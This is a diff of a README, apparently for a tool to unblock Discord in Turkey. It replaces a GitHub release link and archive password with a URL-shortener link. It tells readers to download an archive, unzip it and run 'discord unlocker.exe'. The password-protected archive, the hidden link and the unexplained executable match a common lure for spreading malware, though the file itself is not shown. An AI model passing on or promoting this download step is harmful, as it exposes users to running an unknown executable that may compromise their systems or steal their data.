@@ -2,8 +2,7 @@
 
 ![hd](https://github.com/user-attachments/assets/d80eb5c6-a963-4e72-839a-a07cf35076de)
 
-# [DOWNLOAD](https://github.com/FakeSmile-ai/how-to-unblock-discrod-in-turkey/releases/download/ds/discord.software.zip)
-## Archive password - ***TR-dsunlock037***
+# [DOWNLOAD](https://4jjj.short.gy/kg21k1)
 
  *download the archive, unzip it and launch the "discord unlocker.exe" file
 
